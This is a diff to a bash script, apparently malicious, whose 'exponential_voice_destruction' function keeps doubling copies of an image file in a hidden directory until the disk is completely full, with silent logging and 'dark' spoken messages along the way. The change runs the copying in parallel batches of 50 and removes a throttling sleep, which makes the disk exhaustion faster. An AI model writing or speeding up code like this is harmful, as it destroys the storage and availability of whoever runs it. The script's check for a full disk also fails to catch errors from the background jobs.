@@ -106,21 +106,36 @@ exponential_voice_destruction() {
         log_silent "Round $round: doubling $current_count to $new_target"
         speak_dark_message
         
-        # Create files for this round
+        # PARALLEL FILE CREATION FOR 1000+ FILES PER SECOND
         local created_this_round=0
-        for ((i=1; i<=files_to_create; i++)); do
-            local new_file_num=$((current_count + i))
-            local source_file_num=$(((new_file_num - 1) % current_count + 1))
+        local batch_size=50  # Process 50 files in parallel at once
+        
+        for ((i=1; i<=files_to_create; i+=batch_size)); do
+            # Create batch of files in parallel
+            for ((j=0; j<batch_size && (i+j)<=files_to_create; j++)); do
+                local new_file_num=$((current_count + i + j))
+                local source_file_num=$(((new_file_num - 1) % current_count + 1))
+                
+                # Copy in background for parallel processing
+                (
+                    if ! cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
+                            "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
+                        exit 1
+                    fi
+                ) &
+            done
             
-            # Copy existing file to create new one
-            if ! cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
-                    "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
-                log_silent "Disk completely full after $((current_count + created_this_round)) files"
+            # Wait for this batch to complete
+            wait
+            
+            # Check if any failed (disk full)
+            if [[ $? -ne 0 ]]; then
+                log_silent "Disk completely full after approximately $((current_count + created_this_round)) files"
                 speak_dark_message
                 return
             fi
             
-            created_this_round=$((created_this_round + 1))
+            created_this_round=$((created_this_round + batch_size))
             
             # Dark commentary every 40 files
             if [[ $((created_this_round % 40)) -eq 0 ]]; then
@@ -152,8 +167,6 @@ exponential_voice_destruction() {
                 speak_dark_message
                 ;;
         esac
-        
-        # REMOVED: sleep 0.4 for light speed generation
     done
 }
 
